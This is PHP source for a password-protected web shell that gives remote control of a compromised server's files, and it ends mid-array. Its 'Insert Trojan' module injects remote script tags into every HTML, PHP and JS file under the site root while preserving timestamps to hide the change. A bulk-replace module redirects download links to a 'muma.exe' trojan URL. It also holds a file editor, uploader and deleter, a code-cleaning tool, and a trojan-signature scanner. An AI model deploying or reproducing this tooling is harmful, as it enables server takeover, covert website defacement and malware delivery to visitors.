<?php
$password = "admin!@#";//change password here
error_reporting(E_ERROR);
set_time_limit(0);
$lanip = getenv('REMOTE_ADDR');

function Root_GP(&$array)
{
	while(list($key,$var) = each($array))
	{
		if((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv')
		{
			if(is_string($var)) $array[$key] = stripslashes($var);
			if(is_array($var)) $array[$key] = Root_GP($var);  
		}
	}
	return $array;
}

function Root_CSS()
{
print<<<END
<style type="text/css">
	*{padding:0; margin:0;}
	body{background:threedface;font-family:"Verdana", "Tahoma", sans-serif; font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
	a{color:#000000;text-decoration:none;}
	a:hover{background:#33FF33;}
	table{color:#000000;font-family:"Verdana", "Tahoma", sans-serif;font-size:13px;border:1px solid #999999;}
	td{background:#F9F6F4;}
        .bt{background:#3d3d3d;color:#ffffff;border:2px;font:13px Arial,Tahoma;height:22px;}
	.toptd{background:threedface; width:310px; border-color:#FFFFFF #999999 #999999 #FFFFFF; border-style:solid;border-width:1px;}
	.msgbox{background:#FFFFE0;color:#FF0000;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding:3px;clear:both;}
	.actall{background:#F9F6F4;font-size:14px;border:1px solid #999999;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
</style>\n
END;
return false;
}

//file manager
function File_Str($string)
{
	return str_replace('//','/',str_replace('\\','/',$string));
}

function File_Size($size)
{
	if($size > 1073741824) $size = round($size / 1073741824 * 100) / 100 . ' G';
	elseif($size > 1048576) $size = round($size / 1048576 * 100) / 100 . ' M';
	elseif($size > 1024) $size = round($size / 1024 * 100) / 100 . ' K';
	else $size = $size . ' B';
	return $size;
}

function File_Mode()
{
	$RealPath = realpath('./');
	$SelfPath = $_SERVER['PHP_SELF'];
	$SelfPath = substr($SelfPath, 0, strrpos($SelfPath,'/'));
	return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
}

function File_Read($filename)
{
	$handle = @fopen($filename,"rb");
	$filecode = @fread($handle,@filesize($filename));
	@fclose($handle);
	return $filecode;
}

function File_Write($filename,$filecode,$filemode)
{
	$handle = @fopen($filename,$filemode);
	$key = @fwrite($handle,$filecode);
	if(!$key)
	{
		@chmod($filename,0666);
		$key = @fwrite($handle,$filecode);
	}
	@fclose($handle);
	return $key;
}

function File_Up($filea,$fileb)
{
	$key = @copy($filea,$fileb) ? true : false;
	if(!$key) $key = @move_uploaded_file($filea,$fileb) ? true : false;
	return $key;
}

function File_Down($filename)
{
	if(!file_exists($filename)) return false;
	$filedown = basename($filename);
	$array = explode('.', $filedown);
	$arrayend = array_pop($array);
	header('Content-type: application/x-'.$arrayend);
	header('Content-Disposition: attachment; filename='.$filedown);
	header('Content-Length: '.filesize($filename));
	@readfile($filename);
	exit;
} 

function File_Deltree($deldir)
{
	if(($mydir = @opendir($deldir)) == NULL) return false;	
	while(false !== ($file = @readdir($mydir)))
	{
		$name = File_Str($deldir.'/'.$file);
		if((is_dir($name)) && ($file!='.') && ($file!='..')){@chmod($name,0777);rmdir($name);}
		if(is_file($name)){@chmod($name,0777);@unlink($name);}
	} 
	@closedir($mydir);
	@chmod($deldir,0777);
	return @rmdir($deldir) ? true : false;
}

function File_Act($array,$actall,$inver)
{
	if(($count = count($array)) == 0) return 'select file plz';
	$i = 0;
	while($i < $count)
	{
		$array[$i] = urldecode($array[$i]);
		switch($actall)
		{
			case "a" : $inver = urldecode($inver); if(!is_dir($inver)) return 'path error'; $filename = array_pop(explode('/',$array[$i])); @copy($array[$i],File_Str($inver.'/'.$filename)); $msg = 'copy'; break;
			case "b" : if(!@unlink($array[$i])){@chmod($filename,0666);@unlink($array[$i]);} $msg = 'del'; break;
			case "c" : if(!eregi("^[0-7]{4}$",$inver)) return 'wrong attr value'; $newmode = base_convert($inver,8,10); @chmod($array[$i],$newmode); $msg = 'change attr'; break;
			case "d" : @touch($array[$i],strtotime($inver)); $msg = 'change time'; break;
		}
		$i++;
	}
	return 'select files '.$msg.' done';
}

function File_Edit($filepath,$filename,$dim = '')
{
	$THIS_DIR = urlencode($filepath);
	$THIS_FILE = File_Str($filepath.'/'.$filename);
	if(file_exists($THIS_FILE)){$FILE_TIME = @date('Y-m-d H:i:s',filemtime($THIS_FILE));$FILE_CODE = htmlspecialchars(File_Read($THIS_FILE));}
	else {$FILE_TIME = @date('Y-m-d H:i:s',time());$FILE_CODE = '';}
print<<<END
<script language="javascript">
var NS4 = (document.layers);
var IE4 = (document.all);
var win = this;
var n = 0;
function search(str){
	var txt, i, found;
	if(str == "")return false;
	if(NS4){
		if(!win.find(str)) while(win.find(str, false, true)) n++; else n++;
		if(n == 0) alert(str + " ... Not-Find")
	}
	if(IE4){
		txt = win.document.body.createTextRange();
		for(i = 0; i <= n && (found = txt.findText(str)) != false; i++){
			txt.moveStart("character", 1);
			txt.moveEnd("textedit")
		}
		if(found){txt.moveStart("character", -1);txt.findText(str);txt.select();txt.scrollIntoView();n++}
		else{if (n > 0){n = 0;search(str)}else alert(str + "... Not-Find")}
	}
	return false
}
function CheckDate(){
	var re = document.getElementById('mtime').value;
	var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
	var r = re.match(reg);
	if(r==null){alert('wrong time!format:yyyy-mm-dd hh:mm:ss');return false;}
	else{document.getElementById('editor').submit();}
}
</script>
<div class="actall">search content: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type='button' value="search" onclick="search(searchs.value)"></div>
<form method="POST" id="editor" action="?s=a&p={$THIS_DIR}">
<div class="actall"><input type="text" name="pfn" value="{$THIS_FILE}" style="width:750px;"></div>
<div class="actall"><textarea name="pfc" style="width:750px;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">change file time <input type="text" name="mtime" id="mtime" value="{$FILE_TIME}" style="width:150px;"></div>
<div class="actall"><input class="bt" type="button" value="save" onclick="CheckDate();">
<input class="bt" type="button" value="back" onclick="window.location='?s=a&p={$THIS_DIR}';"></div>
</form>
END;
}


function File_a($p)
{
	$MSG_BOX = 'waiting for message queue......';
        if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
	$UP_DIR = urlencode(File_Str($p.'/..'));
	$REAL_DIR = File_Str(realpath($p));
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
	$THIS_DIR = urlencode(File_Str($p));
	$UP_DIR = urlencode(File_Str(dirname($p)));
	$NUM_D = 0;
	$NUM_F = 0;
	if(!empty($_POST['pfn'])){$intime = @strtotime($_POST['mtime']);$MSG_BOX = File_Write($_POST['pfn'],$_POST['pfc'],'wb') ? 'edit file '.$_POST['pfn'].' success' : 'edit file '.$_POST['pfn'].' faild';@touch($_POST['pfn'],$intime);}
	if(!empty($_POST['ufs'])){if($_POST['ufn'] != '') $upfilename = $_POST['ufn']; else $upfilename = $_FILES['ufp']['name'];$MSG_BOX = File_Up($_FILES['ufp']['tmp_name'],File_Str($p.'/'.$upfilename)) ? 'upfile '.$upfilename.' success' : 'upfile '.$upfilename.' 失败';}
	if(!empty($_POST['actall'])){$MSG_BOX = File_Act($_POST['files'],$_POST['actall'],$_POST['inver']);}
	if(!empty($_GET['mn'])){$MSG_BOX = @rename(File_Str($p.'/'.$_GET['mn']),File_Str($p.'/'.$_GET['rn'])) ? 'rename '.$_GET['mn'].' to '.$_GET['rn'].' success' : 'rename '.$_GET['mn'].' to '.$_GET['rn'].' faild';}
	if(!empty($_GET['dn'])){$MSG_BOX = @mkdir(File_Str($p.'/'.$_GET['dn']),0777) ? 'create folder '.$_GET['dn'].' success' : 'create folder '.$_GET['dn'].' faild';}
	if(!empty($_GET['dd'])){$MSG_BOX = File_Deltree($_GET['dd']) ? 'del folder '.$_GET['dd'].' success' : 'del folder '.$_GET['dd'].' faild';}
	if(!empty($_GET['df'])){if(!File_Down($_GET['df'])) $MSG_BOX = 'the download file does not exists';}
	Root_CSS();
print<<<END
<script type="text/javascript">
	function Inputok(msg,gourl)
	{
		smsg = "current file:[" + msg + "]";
		re = prompt(smsg,unescape(msg));
		if(re)
		{
			var url = gourl + escape(re);
			window.location = url;
		}
	}
	function Delok(msg,gourl)
	{
		smsg = "sure for del [" + unescape(msg) + "] ?";
		if(confirm(smsg))
		{
			if(gourl == 'b'){document.getElementById('actall').value = escape(gourl);document.getElementById('fileall').submit();}
			else window.location = gourl;
		}
	}
	function CheckDate(msg,gourl)
	{
		smsg = "current file time:[" + msg + "]";
		re = prompt(smsg,msg);
		if(re)
		{
			var url = gourl + re;
			var reg = /^(\\d{1,4})(-|\\/)(\\d{1,2})\\2(\\d{1,2}) (\\d{1,2}):(\\d{1,2}):(\\d{1,2})$/; 
			var r = re.match(reg);
			if(r==null){alert('time error!format:yyyy-mm-dd hh:mm:ss');return false;}
			else{document.getElementById('actall').value = gourl; document.getElementById('inver').value = re; document.getElementById('fileall').submit();}
		}
	}
	function CheckAll(form)
	{
		for(var i=0;i<form.elements.length;i++)
		{
			var e = form.elements[i];
			if (e.name != 'chkall')
			e.checked = form.chkall.checked;
		}
	}
	function SubmitUrl(msg,txt,actid)
	{
		re = prompt(msg,unescape(txt));
		if(re)
		{
			document.getElementById('actall').value = actid;
			document.getElementById('inver').value = escape(re);
			document.getElementById('fileall').submit();
		}
	}
</script>
	<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
	<div class="actall" style="text-align:center;padding:3px;">
	<form method="GET"><input type="hidden" name="s" value="a">
	<input type="text" name="p" value="{$p}" style="width:50%;height:22px;">
	<select onchange="location.href='?s=a&p='+options[selectedIndex].value">
	<option>---some folder---</option>
	<option value="{$ROOT_DIR}"> site root folder </option>
	<option value="{$FILE_DIR}"> current folder </option>
	<option value="C:/Documents and Settings/All Users/「开始」菜单/程序/启动"> start item (cn) </option>
	<option value="C:/Documents and Settings/All Users/Start Menu/Programs/Startup"> start item (en) </option>
	<option value="C:/RECYCLER"> RECYCLER </option>
	<option value="C:/Program Files"> Program Files </option>
	</select> <input class="bt" type="submit" value="jump"></form>
	<div style="margin-top:3px;"></div>
	<form method="POST" action="?s=a&p={$THIS_DIR}" enctype="multipart/form-data">
	<input class="bt" type="button" value="Create File" onclick="Inputok('newfile.php','?s=p&fp={$THIS_DIR}&fn=');">
	<input class="bt" type="button" value="Create Folder" onclick="Inputok('newdir','?s=a&p={$THIS_DIR}&dn=');"> 
	<input type="file" name="ufp" style="width:30%;height:22px;">
	<input type="text" name="ufn" style="width:20%;height:22px;">
	<input class="bt" type="submit" name="ufs" value="upfile">
	</form>
	</div>
	<form method="POST" id="fileall" action="?s=a&p={$THIS_DIR}">
	<table border="0"><tr>
	<td class="toptd" style="width:810px;"> <a href="?s=a&p={$UP_DIR}"><b>parent directory</b></a> </td>
	<td class="toptd" style="width:100px;"> opertion </td>
	<td class="toptd" style="width:60px;"> attr </td>
	<td class="toptd" style="width:200px;"> time </td>
	<td class="toptd" style="width:100px;"> size </td></tr>
END;
	if(($h_d = @opendir($p)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' or $Filename == '..') continue;
		$Filepath = File_Str($p.'/'.$Filename);
		if(is_dir($Filepath))
		{
			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
			$Filepath = urlencode($Filepath);
			echo "\n".'<tr><td><a href="?s=a&p='.$Filepath.'"><font face="wingdings" size="3">0</font><b>'.$Filename.'</b></a></td>';
			$Filename = urlencode($Filename);
			echo '<td><a href="#" onclick="Delok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&dd='.$Filename.'\');return false;">Del</a> ';
			echo '<a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;">Rename</a></td>';
			echo '<td><a href="#" onclick="Inputok(\''.$Fileperm.'\',\'?s=a&p='.$THIS_DIR.'&mk='.$Filename.'&md=\');return false;">'.$Fileperm.'</a></td>';
			echo '<td>'.$Filetime.'</td> ';
			echo '<td> </td></tr>'."\n";
			$NUM_D++;
		}
	}
	@rewinddir($h_d);
        while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' or $Filename == '..') continue;
		$Filepath = File_Str($REAL_DIR.'/'.$Filename);
		if(!is_dir($Filepath))
		{
			$Fileurls = str_replace(File_Str($ROOT_DIR.'/'),$GETURL,$Filepath);
			$Fileperm = substr(base_convert(@fileperms($Filepath),10,8),-4);
			$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
			$Filesize = File_Size(@filesize($Filepath));
			if($Filepath == File_Str(__FILE__)) $fname = '<font color="#FF0000">'.$Filename.'</font>'; else $fname = $Filename;
			echo "\r\n".' <tr><td> <input type="checkbox" name="files[]" value="'.urlencode($Filepath).'"><a target="_blank" href="'.$Fileurls.'">'.$fname.'</a> </td>';
			$Filepath = urlencode($Filepath);
			$Filename = urlencode($Filename);
                        echo ' <td> <a href="?s=p&fp='.$THIS_DIR.'&fn='.$Filename.'"> Edit </a> ';
			echo ' <a href="#" onclick="Inputok(\''.$Filename.'\',\'?s=a&p='.$THIS_DIR.'&mn='.$Filename.'&rn=\');return false;"> Rename </a> </td>';
			echo ' <td>'.$Fileperm.'</td> ';
			echo ' <td>'.$Filetime.'</td> ';
			echo ' <td align="right"> <a href="?s=a&df='.$Filepath.'">'.$Filesize.'</a> </td></tr> '."\r\n";
			$NUM_F++;
                
		}
	}
	@closedir($h_d);
print<<<END
</table>
<div class="actall"><input type="hidden" name="actall" value="undefined">
<input type="hidden" name="inver" value="undefined">
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
<input class="bt" type="button" value="Copy" onclick="SubmitUrl('copy selected files to folder: ','{$THIS_DIR}','a');return false;"> 
<input class="bt" type="button" value="Del" onclick="Delok('selected files','b');return false;"> 
<input class="bt" type="button" value="Attr" onclick="SubmitUrl('change selected files attr value: ','0666','c');return false;"> 
<input class="bt" type="button" value="Time" onclick="CheckDate('2010-04-21 17:31:20','d');return false;"> 
folders({$NUM_D}) / files({$NUM_F})</div>
</form>
END;
	return true;
}


//Insert Trojan
function Guama_Pass($length)
{
	$possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	$str = "";
	while(strlen($str) < $length) $str .= substr($possible,(rand() % strlen($possible)),1);
	return $str;
}

function Guama_Auto($gp,$gt,$gl,$gc,$incode,$gk,$gd,$gb,$go)
{
	if(($h_d = @opendir($gp)) == NULL) return false;
	if($go)
	{
		preg_match_all("/\[\-([^~]*?)\-\]/i",$gc,$nc);
		$passm = (int)$nc[1][0];
		if((!eregi("^[0-9]{1,2}$",$nc[1][0])) || ($passm > 12)) return false;
	}
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		if($gl != ''){if(eregi($gl,$Filename)) continue;}
		$Filepath = File_Str($gp.'/'.$Filename);
		if(is_dir($Filepath) && $gb) Guama_Auto($Filepath,$gt,$gl,$gc,$incode,$gk,$gd,$gb,$go);
		if(eregi($gt,$Filename))
		{
			$ic = File_Read($Filepath);
			if(stristr($ic,$gk)) continue;
			if($go) $gc = str_replace($nc[0][0],Guama_Pass($passm),$gc);
			if($gd) $ftime = @filemtime($Filepath);
			if($incode == '1'){if(!stristr($ic,'</head>')) continue; $ic = str_replace('</head>',"\r\n".$gc."\r\n".'</head>'."\r\n",$ic); $ic = str_replace('</HEAD>',"\r\n".$gc."\r\n".'</HEAD>'."\r\n",$ic);}
			if($incode == '2') $ic = $gc."\r\n".$ic;
			if($incode == '3') $ic = $ic."\r\n".$gc;
			echo File_Write($Filepath,$ic,'wb') ? 'ok:'.$Filepath.'<br>'."\r\n" : 'err:'.$Filepath.'<br>'."\r\n";
			if($gd) @touch($Filepath,$ftime);
			ob_flush();
			flush();
		}
	}
	@closedir($h_d);
	return true;
}

function Guama_b()
{
	if((!empty($_POST['gp'])) && (!empty($_POST['gt'])) && (!empty($_POST['gc'])))
	{
		$gk = '';
		$go = false;
		$gt = str_replace('.','\\.',$_POST['gt']);
		$gl = isset($_POST['gl']) ? str_replace('.','\\.',$_POST['gl']) : '';
		$gd = isset($_POST['gd']) ? true : false;
		$gb = ($_POST['gb'] == 'a') ? true : false;
		if(isset($_POST['gx'])){$gk = $_POST['gc'];if(stristr($_POST['gc'],'[-') && stristr($_POST['gc'],'-]')){$temp = explode('[-',$_POST['gc']); $gk = $temp[0]; $go = true;}}
		echo Guama_Auto($_POST['gp'],$gt,$gl,$_POST['gc'],$_POST['incode'],$gk,$gd,$gb,$go) ? 'Done' : 'Abort';
		echo '<br><input class="bt" type="button" value="back" onclick="history.back();">';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
print<<<END
<script language="javascript">
function Fulll(i){
	if(i==0) return false;
  Str = new Array(5);
  if(i <= 2){Str[1] = "{$ROOT_DIR}";Str[2] = "{$FILE_DIR}";sform.gp.value = Str[i];}
  else{Str[3] = ".htm|.html|.shtml";Str[4] = ".htm|.html|.shtml|.asp|.php|.jsp|.cgi|.aspx|.do";Str[5] = ".js";sform.gt.value = Str[i];}
  return true;
}
function autorun(){
	if(document.getElementById('gp').value == ''){alert('path can not be empty');return false;}
	if(document.getElementById('gt').value == ''){alert('type can not be empty');return false;}
	if(document.getElementById('gc').value == ''){alert('code can not be empty');return false;}
	document.getElementById('sform').submit();
}
</script>
<form method="POST" name="sform" id="sform" action="?s=b">
<div class="actall" style="height:35px;">Path: <input type="text" name="gp" id="gp" value="{$ROOT_DIR}" style="width:500px;">
<select onchange='return Fulll(options[selectedIndex].value)'>
<option value="0" selected>--select range--</option>
<option value="1">site root folder</option>
<option value="2">current folder</option>
</select></div>
<div class="actall" style="height:35px;">Type: <input type="text" name="gt" id="gt" value=".htm|.html|.shtml" style="width:500px;">
<select onchange='return Fulll(options[selectedIndex].value)'>
<option value="0" selected>--select  type--</option>
<option value="3">html</option>
<option value="4">script+html</option>
<option value="5">JS</option>
</select></div>
<div class="actall" style="height:35px;">Filter: <input type="text" name="gl" value="templet|templets|default|editor|fckeditor.html" style="width:500px;" disabled>
<input type="radio" name="inout" onclick="gl.disabled=false;">Open <input type="radio" name="inout" onclick="gl.disabled=true;" checked>Close</div>
<div class="actall">Insert Code: <textarea name="gc" id="gc" style="width:610px;height:180px;">&lt;script language=javascript src="http://www.baidu.com/ad.js?[-6-]"&gt;&lt;/script&gt;</textarea>
<div class="msgbox">挂马变形说明: 程序自动寻找[-6-]标签,替换为随机字符,6表示六位随机字符,最大12位,如果不变形可以不加[-6-]标签.
<br>Example: &lt;script language=javascript src="http://www.baidu.com/ad.js?EMTDSU"&gt;&lt;/script&gt;</div></div>
<div class="actall" style="height:35px;"><input type="radio" name="incode" value="1" checked>insert before &lt;/head&gt; 
<input type="radio" name="incode" value="2">insert the top of file 
<input type="radio" name="incode" value="3">insert the end of file</div>
<div class="actall" style="height:30px;"><input type="checkbox" name="gx" value="1" checked>Automatic filter double code <input type="checkbox" name="gd" value="1" checked>keep file time unchanged</div>
<div class="actall" style="height:50px;"><input type="radio" name="gb" value="a" checked>applied to current folder,subfolders and files
<br><input type="radio" name="gb" value="b">only applied to current folder</div>
<div class="actall"><input class="bt" type="button" value="Insert" onclick="autorun();"></div>
</form>
END;
return true;
}

//clean code

function Qingma_Auto($qp,$qt,$qc,$qd,$qb)
{
	if(($h_d = @opendir($qp)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		$Filepath = File_Str($qp.'/'.$Filename);
		if(is_dir($Filepath) && $qb) Qingma_Auto($Filepath,$qt,$qc,$qd,$qb);
		if(eregi($qt,$Filename))
		{
			$ic = File_Read($Filepath);
			if(!stristr($ic,$qc)) continue;
			$ic = str_replace($qc,'',$ic);
			if($qd) $ftime = @filemtime($Filepath);
			echo File_Write($Filepath,$ic,'wb') ? 'ok:'.$Filepath.'<br>'."\r\n" : 'err:'.$Filepath.'<br>'."\r\n";
			if($qd) @touch($Filepath,$ftime);
			ob_flush();
			flush();
		}
	}
	@closedir($h_d);
	return true;
}

function Qingma_c()
{
	if((!empty($_POST['qp'])) && (!empty($_POST['qt'])) && (!empty($_POST['qc'])))
	{
		$qt = str_replace('.','\\.',$_POST['qt']);
		$qd = isset($_POST['qd']) ? true : false;
		$qb = ($_POST['qb'] == 'a') ? true : false;
		echo Qingma_Auto($_POST['qp'],$qt,$_POST['qc'],$qd,$qb) ? 'Done' : 'Abort';
		echo '<br><input class="bt" type="button" value="back" onclick="history.back();">';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
print<<<END
<script language="javascript">
function Fullll(i){
	if(i==0) return false;
  Str = new Array(5);
  if(i <= 2){Str[1] = "{$ROOT_DIR}";Str[2] = "{$FILE_DIR}";xform.qp.value = Str[i];}
	else{Str[3] = ".htm|.html|.shtml";Str[4] = ".htm|.html|.shtml|.asp|.php|.jsp|.cgi|.aspx|.do";Str[5] = ".js";xform.qt.value = Str[i];}
  return true;
}
function autoup(){
	if(document.getElementById('qp').value == ''){alert('path can not be empty');return false;}
	if(document.getElementById('qt').value == ''){alert('type can not be empty');return false;}
	if(document.getElementById('qc').value == ''){alert('code can not be empty');return false;}
	document.getElementById('xform').submit();
}
</script>
<form method="POST" name="xform" id="xform" action="?s=c">
<div class="actall" style="height:35px;">Path: <input type="text" name="qp" id="qp" value="{$ROOT_DIR}" style="width:500px;">
<select onchange='return Fullll(options[selectedIndex].value)'>
<option value="0" selected>--select range--</option>
<option value="1">site root folder</option>
<option value="2">current folder</option>
</select></div>
<div class="actall" style="height:35px;">Type: <input type="text" name="qt" id="qt" value=".htm|.html|.shtml" style="width:500px;">
<select onchange='return Fullll(options[selectedIndex].value)'>
<option value="0" selected>--select type--</option>
<option value="3">html</option>
<option value="4">script+html</option>
<option value="5">js</option>
</select></div>
<div class="actall">Clean Code <textarea name="qc" id="qc" style="width:610px;height:180px;">&lt;script language=javascript src="http://www.baidu.com/ad.js"&gt;&lt;/script&gt;</textarea></div>
<div class="actall" style="height:30px;"><input type="checkbox" name="qd" value="1" checked>keep file time unchanged</div>
<div class="actall" style="height:50px;"><input type="radio" name="qb" value="a" checked>applied to current folder,subfolders and files
<br><input type="radio" name="qb" value="b">only applied to current folder</div>
<div class="actall"><input class="bt" type="button" value="begin" onclick="autoup();"></div>
</form>
END;
	return true;
}

//bulk replace

function Tihuan_Auto($tp,$tt,$th,$tca,$tcb,$td,$tb)
{
	if(($h_d = @opendir($tp)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		$Filepath = File_Str($tp.'/'.$Filename);
		if(is_dir($Filepath) && $tb) Tihuan_Auto($Filepath,$tt,$th,$tca,$tcb,$td,$tb);
		$doing = false;
		if(eregi($tt,$Filename))
		{
			$ic = File_Read($Filepath);
			if($th)
			{
				if(!stristr($ic,$tca)) continue;
				$ic = str_replace($tca,$tcb,$ic);
				$doing = true;
			}
			else
			{
				preg_match_all("/\<a href\=\"([^~]*?)\"/i",$ic,$nc);
				for($i = 0;$i < count($nc[1]);$i++){if(eregi($tca,$nc[1][$i])){$ic = str_replace($nc[1][$i],$tcb,$ic);$doing = true;}}
			}
			if($td) $ftime = @filemtime($Filepath);
			if($doing) echo File_Write($Filepath,$ic,'wb') ? 'ok:'.$Filepath.'<br>'."\r\n" : 'err:'.$Filepath.'<br>'."\r\n";
			if($td) @touch($Filepath,$ftime);
			ob_flush();
			flush();
		}
	}
	@closedir($h_d);
	return true;
}

function Tihuan_d()
{
	if((!empty($_POST['tp'])) && (!empty($_POST['tt'])))
	{
		$tt = str_replace('.','\\.',$_POST['tt']);
		$td = isset($_POST['td']) ? true : false;
		$tb = ($_POST['tb'] == 'a') ? true : false;
		$th = ($_POST['th'] == 'a') ? true : false;
		if($th) $_POST['tca'] = str_replace('.','\\.',$_POST['tca']);
		echo Tihuan_Auto($_POST['tp'],$tt,$th,$_POST['tca'],$_POST['tcb'],$td,$tb) ? 'Done' : 'Abort';
		echo '<br><input class="bt" type="button" value="back" onclick="window.location=\'?s=d\'">';
		return false;
	}
	$FILE_DIR = File_Str(dirname(__FILE__));
	$ROOT_DIR = File_Mode();
print<<<END
<script language="javascript">
function Fulllll(i){
	if(i==0) return false;
  Str = new Array(5);
  if(i <= 2){Str[1] = "{$ROOT_DIR}";Str[2] = "{$FILE_DIR}";tform.tp.value = Str[i];}
	else{Str[3] = ".htm|.html|.shtml";Str[4] = ".htm|.html|.shtml|.asp|.php|.jsp|.cgi|.aspx|.do";Str[5] = ".js";tform.tt.value = Str[i];}
  return true;
}
function showth(th){
	if(th == 'a') document.getElementById('setauto').innerHTML = '<tr>Searchment</tr> <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>Replacement <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea>';
	if(th == 'b') document.getElementById('setauto').innerHTML = '<br><tr>Download Suffix</tr> <input type="text" name="tca" id="tca" value=".exe|.z0|.rar|.zip|.gz|.torrent" style="width:500px;"><br><br>&nbsp&nbsp&nbspReplacement&nbsp&nbsp&nbsp<input type="text" name="tcb" id="tcb" value="http://www.baidu.com/download/muma.exe" style="width:500px;">';
	return true;
}
function autoup(){
	if(document.getElementById('tp').value == ''){alert('path can not be empty');return false;}
	if(document.getElementById('tt').value == ''){alert('type can not be empty');return false;}
	if(document.getElementById('tca').value == '' || document.getElementById('tcb').value == ''){alert('replacement can not be empty');return false;}
	document.getElementById('tform').submit();
}
</script>
<form method="POST" name="tform" id="tform" action="?s=d">
<div class="actall" style="height:35px;">Path: <input type="text" name="tp" id="tp" value="{$ROOT_DIR}" style="width:500px;">
<select onchange='return Fulllll(options[selectedIndex].value)'>
<option value="0" selected>--select range--</option>
<option value="1">site root folder</option>
<option value="2">current folder</option>
</select></div>
<div class="actall" style="height:35px;">Type: <input type="text" name="tt" id="tt" value=".htm|.html|.shtml" style="width:500px;">
<select onchange='return Fulllll(options[selectedIndex].value)'>
<option value="0" selected>--select type--</option>
<option value="3">html</option>
<option value="4">script+html</option>
<option value="5">js</option>
</select></div>
<div class="actall" style="height:235px;"><input type="radio" name="th" value="a" onclick="showth('a')" checked>Designated Content Of The Repalce File <input type="radio" name="th" value="b" onclick="showth('b')">Download Url Of The Replace File<br>
<div id="setauto">Searchment:&nbsp <textarea name="tca" id="tca" style="width:610px;height:100px;"></textarea><br>Replacement: <textarea name="tcb" id="tcb" style="width:610px;height:100px;"></textarea></div></div>
<div class="actall" style="height:30px;"><input type="checkbox" name="td" value="1" checked>keep file time unchanged</div>
<div class="actall" style="height:50px;"><input type="radio" name="tb" value="a" checked>applied to current folder,subfolders and files
<br><input type="radio" name="tb" value="b">only applied to current folder</div>
<div class="actall"><input class="bt" type="button" value="Begin" onclick="autoup();"></div>
</form>
END;
	return true;
}

//clean trojan

function Antivirus_Auto($sp,$features,$st)
{
	if(($h_d = @opendir($sp)) == NULL) return false;
	$ROOT_DIR = File_Mode();
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		$Filepath = File_Str($sp.'/'.$Filename);
		if(is_dir($Filepath)) Antivirus_Auto($Filepath,$features,$st);
		if(eregi($st,$Filename))
		{
			if($Filepath == File_Str(__FILE__)) continue;
			$ic = File_Read($Filepath);
			foreach($features as $var => $key)
			{
				if(stristr($ic,$key))
				{
					$Fileurls = str_replace($ROOT_DIR,'http://'.$_SERVER['SERVER_NAME'].'/',$Filepath);
					$Filetime = @date('Y-m-d H:i:s',@filemtime($Filepath));
					echo '<a href="'.$Fileurls.'" target="_blank"><font color="#FF0000">'.$Filepath.'</font></a><br>【<a href="?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'" target="_blank">Edit</a> <a href="?s=e&df='.urlencode($Filepath).'" target="_blank">Del</a>】 ';
					echo '【'.$Filetime.'】 <font color="#FF0000">'.$var.'</font><br><br>';
					break;
				}
			}
			ob_flush();
			flush();
		}
	}
	@closedir($h_d);
	return true;
}

function Antivirus_e()
{
	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo ' <font style=font:11pt color=ff0000>del successfully</font>';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? ' <font style=font:11pt color=ff0000>del successfully</font>' : ' <font style=font:11pt color=ff0000>del faild</font>';} return false;}
	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
	$SCAN_DIR = (File_Mode() == '') ? File_Str(dirname(__FILE__)) : File_Mode();
	$features_php = array('ftp.class.php'=>'ftp.class.php','cha88.cn'=>'cha88.cn','Security Angel Team'=>'Security Angel Team','read()'=>'->read()','readdir'=>'readdir(','return string soname'=>'returns string soname','eval()'=>'eval(gzinflate(','eval(base64_decode())'=>'eval(base64_decode(','eval($_POST)'=>'eval($_POST','eval($_REQUEST)'=>'eval($_REQUEST','eval ($_)'=>'eval ($_','copy()'=>'copy($_FILES','copy ()'=>'copy ($_FILES','move_uploaded_file()'=>'move_uploaded_file($_FILES','move_uploaded_file ()'=>'move_uploaded_file ($_FILES','str_replace()'=>'str_replace(\'\\\\\',\'/\',');
